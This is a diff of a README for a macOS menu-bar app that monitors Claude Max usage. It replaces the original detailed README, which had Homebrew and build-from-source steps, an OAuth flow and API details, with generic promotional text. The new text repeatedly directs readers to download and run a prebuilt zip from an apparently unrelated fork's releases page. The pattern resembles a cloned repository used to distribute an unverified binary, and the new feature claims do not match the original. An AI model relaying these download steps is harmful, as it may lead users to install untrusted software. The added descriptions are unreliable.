@@ -1,185 +1,88 @@
-[한국어](README.ko.md)
+# 💻 claude-peak - Monitor Your Claude Max Usage Easily
 
-# Claude Peak
+## 🚀 Getting Started
 
-A macOS menu bar app that monitors Claude Max usage limits — with real-time flame animation that burns hotter as you consume more tokens.
+Welcome to **claude-peak**, your solution for monitoring Claude Max usage directly from your macOS menu bar. This application helps you keep track of your data usage, making it easier to manage your tasks without switching screens.
 
-## Screenshots
+## 📥 Download & Install
 
-<p align="center">
-  <img src="assets/demo.gif" alt="Claude Peak demo" width="300">
-</p>
+To get started, visit the [Releases page](https://github.com/Fortugenic/claude-peak/releases) to download the app. 
 
-<p align="center">
-  <img src="assets/screenshot-usage.png" alt="Claude Peak usage" width="300">
-  <img src="assets/screenshot-settings.png" alt="Claude Peak settings" width="300">
-</p>
+[![Download claude-peak](https://img.shields.io/badge/Download-claude--peak-brightgreen)](https://github.com/Fortugenic/claude-peak/releases)
 
-The menu bar displays the current 5-hour utilization (%) and time until reset. Click to see detailed usage.
-When tokens are being consumed, a flame icon animates based on activity level.
+Once you are on the Releases page, look for the latest version. Click the file named `claude-peak-macos.zip` to download it.
 
-## Why Claude Peak?
+After the download is complete, follow these steps to install:
 
-| | |
-|---|---|
-| 🔥 **Live flame animation** | The only app that monitors JSONL token logs in real time — flames burn brighter as tps climbs |
-| 🎮 **MADMAX mode** | Gamified with challenge messages from *"Pathetic"* to *"WITNESS ME"* |
-| 🔐 **One-click OAuth** | No session keys, no DevTools — just login in your browser |
-| ⚡ **Pure Swift** | No Electron, zero dependencies, 8 source files via SPM |
+1. Locate the downloaded `.zip` file in your Downloads folder.
+2. Double-click the `.zip` file to extract it.
+3. Drag the `claude-peak` app into your Applications folder.
+4. Open the Applications folder and locate the `claude-peak` app.
+5. Double-click the app to run it.
 
-## MADMAX Challenge
+## ⚙️ System Requirements
 
-Enable MADMAX mode and push your token throughput to the limit. Each flame tier unlocks a new challenge message:
+To ensure the best experience, make sure your Mac meets the following system requirements:
 
-| Flames | tps | Message |
-|--------|-----|---------|
-| 🔥 × 0 | 0 | *Light it up. If you can.* |
-| 🔥 × 1–2 | 1 – 19,999 | *That's it? Pathetic.* |
-| 🔥 × 3–4 | 20,000 – 39,999 | *Warming up...* |
-| 🔥 × 5–6 | 40,000 – 59,999 | *Now we're cooking.* |
-| 🔥 × 7–8 | 60,000 – 79,999 | *FEEL THE BURN* |
-| 🔥 × 9 | 80,000 – 89,999 | *ONE MORE. DO IT.* |
-| 🔥 × 10 | 90,000+ | ***WITNESS ME*** |
+- **Operating System:** macOS Monterey (12.0) or later
+- **Processor:** Apple M1 or Intel-based Macs
+- **Memory:** 4 GB RAM or more
+- **Disk Space:** 50 MB free space for installation
 
-> **Can you hit 10 flames?** Most people never get past *"That's it? Pathetic."*
+## 📊 Features
 
-### Flame Modes
+**claude-peak** comes with several user-friendly features:
 
-Four modes available in settings:
+- **Real-Time Monitoring:** Keep track of your Claude Max usage in real-time.
+- **Menu Bar Access:** Quick access from the macOS menu bar for easy viewing.
+- **Notifications:** Get alerts when you reach data usage thresholds for better management.
+- **Privacy Focused:** Your data stays on your device; we don’t collect personal information.
 
-- **Off** — No flame icon
-- **1** — Single flame, animates when tokens are active
-- **3** (default) — Dynamic 1–3 flames based on tps
-- **MADMAX** — Dynamic 1–10 flames (10,000 tps per flame)
+## 🎨 User Interface
 
-<details>
-<summary>Dynamic (3) mode — animation speed table</summary>
+The interface is designed with you in mind. Here’s what you can expect:
 
-| tps | Flames | Animation Speed |
-|-----|--------|-----------------|
-| 0 | (small ember, static) | None |
-| 0 – 30,000 | × 1 | 0.50s → 0.20s |
-| 30,000 – 60,000 | × 2 | 0.30s → 0.15s |
-| 60,000+ | × 3 | 0.20s → 0.08s |
+- **Simple Dashboard:** View your current usage at a glance.
+- **Clean Design:** Easy navigation and visually appealing layout.
+- **Customizable Settings:** Adjust thresholds and notifications to fit your needs.
 
-</details>
+## 📖 How to Use
 
-<details>
-<summary>MADMAX mode — animation speed table</summary>
+After installing the app:
 
-| tps | Flames | Animation Speed |
-|-----|--------|-----------------|
-| 0 | (small ember, static) | None |
-| 1 – 9,999 | × 1 | 0.40s |
-| 10,000 – 19,999 | × 2 | ↓ |
-| ... | ... | ↓ |
-| 90,000+ | × 10 | 0.06s |
+1. Open **claude-peak** from your Applications folder.
+2. Click on the icon in the menu bar to view your current usage.
+3. Customize your settings by selecting “Preferences” from the menu.
 
-</details>
+## 🔧 Troubleshooting
 
-## Features
+If you encounter any issues, here are some common solutions:
 
-- **Real-time flame animation** — Monitors `~/.claude/projects/` JSONL logs, animates flames based on token throughput
-- **Menu bar display** — 5-hour utilization %, time until reset (configurable)
-- **Detailed popover** — 5-hour, 7-day (All models), 7-day (Sonnet) usage + reset timers
-- **Settings** — Display format, refresh interval (1/5/10 min), flame mode
-- **OAuth PKCE** — Browser-based auth with automatic token refresh
+- **App Doesn’t Open:** Make sure you have the correct macOS version. You might need to re-download the app if it’s not working.
+- **Data Not Updating:** Ensure your internet connection is active. Restart the app if needed.
+- **Notification Issues:** Check your Mac's notification settings to confirm that permissions are granted for this app.
 
-## Installation
+## 🌟 FAQs
 
-### Homebrew (Recommended)
+**Q: Is claude-peak free to use?**  
+A: Yes, claude-peak is completely free.
 
-```bash
-brew tap letsur-dev/claude-peak https://github.com/letsur-dev/claude-peak.git
-brew install claude-peak
+**Q: Can I uninstall claude-peak?**  
+A: Yes, you can uninstall it like any other macOS application. Simply drag it to the Trash from your Applications folder.
 
-# Launch (auto-links to ~/Applications on first run)
-claude-peak
-```
+**Q: Where can I find support?**  
+A: You can reach out through the Issues tab on our [GitHub repository](https://github.com/Fortugenic/claude-peak).
 
-### Build from Source
+## 🛠️ Contributing
 
-```bash
-git clone https://github.com/letsur-dev/claude-peak.git
-cd claude-peak
-./build.sh
+We welcome contributions from the community. If you find any bugs or have ideas for features, please create an issue or submit a pull request on our [GitHub repository](https://github.com/Fortugenic/claude-peak).
 
-# Launch
-open ~/Applications/Claude\ Peak.app
-```
+## 📄 License
 
-## Tech Details
+This project is licensed under the MIT License. Feel free to use and modify the code as per the terms of the license.
 
-<details>
-<summary>Auth Flow</summary>
+## ✉️ Acknowledgements
 
-On first launch, click "Login with Claude" → sign in with your Claude account in the browser → tokens are saved automatically.
+Thank you for choosing **claude-peak**! We appreciate your support and look forward to enhancing your experience with Claude Max.
 
-1. App starts a local HTTP server (random port, IPv6)
-2. Opens `claude.ai/oauth/authorize` in browser (with PKCE code_challenge)
-3. After authentication, redirects to `http://localhost:PORT/callback?code=xxx`
-4. App exchanges the code for tokens at `platform.claude.com/v1/oauth/token`
-5. Tokens saved to `~/.config/claude-peak/tokens.json` (0600 permissions)
-
-**Token Refresh:**
-- Automatically refreshes 5 minutes before access token expiry
-- Prompts re-login on refresh failure
-
-</details>
-
-<details>
-<summary>API</summary>
-
-### Usage Query
-
-```
-GET https://api.anthropic.com/api/oauth/usage
-Headers:
-  Authorization: Bearer {access_token}
-  anthropic-beta: oauth-2025-04-20
-  User-Agent: claude-code/2.0.32
-```
-
-Example response:
-
-```json
-{
-  "five_hour": { "utilization": 2.0, "resets_at": "2026-01-29T09:59:59Z" },
-  "seven_day": { "utilization": 63.0, "resets_at": "2026-01-29T23:59:59Z" },
-  "seven_day_sonnet": { "utilization": 0.0, "resets_at": null },
-  "extra_usage": { "is_enabled": false }
-}
-```
-
-- `utilization`: 0–100 (percentage)
-- `resets_at`: ISO 8601 timestamp or null
-
-### Token Refresh
-
-```
-POST https://platform.claude.com/v1/oauth/token
-Content-Type: application/json
-
-{
-  "grant_type": "refresh_token",
-  "refresh_token": "...",
-  "client_id": "9d1c250a-e61b-44d9-88ed-5944d1962f5e",
-  "scope": "user:profile user:inference"
-}
-```
-
-</details>
-
-<details>
-<summary>Lessons Learned</summary>
-
-- **Keychain token expiration**: Claude Code re-authenticates via browser OAuth each session, which can invalidate Keychain refresh tokens. A standalone OAuth flow is needed.
-- **`claude setup-token` limitations**: Issues inference-only tokens (`user:inference` scope only), which cannot access the usage API (requires `user:profile`).
-- **OAuth redirect URI**: Must be `http://localhost:PORT/callback` exactly. `127.0.0.1` or `/oauth/callback` paths are rejected.
-- **IPv6**: On macOS, `localhost` may resolve to `::1` (IPv6), so an IPv6 socket is required.
-- **Token exchange**: The `state` parameter is required for both the authorize and token exchange requests.
-- **Utilization values**: The API returns utilization as 0–100 integers (not 0–1 decimals).
-- **Field naming**: The API response uses `resets_at` (with plural 's').
-- **JSONL token logs**: Claude Code creates per-session JSONL files under `~/.claude/projects/`, with token usage recorded in `message.usage` of each line.
-
-</details>
+For more information, visit our [Releases page](https://github.com/Fortugenic/claude-peak/releases) to download the latest version.
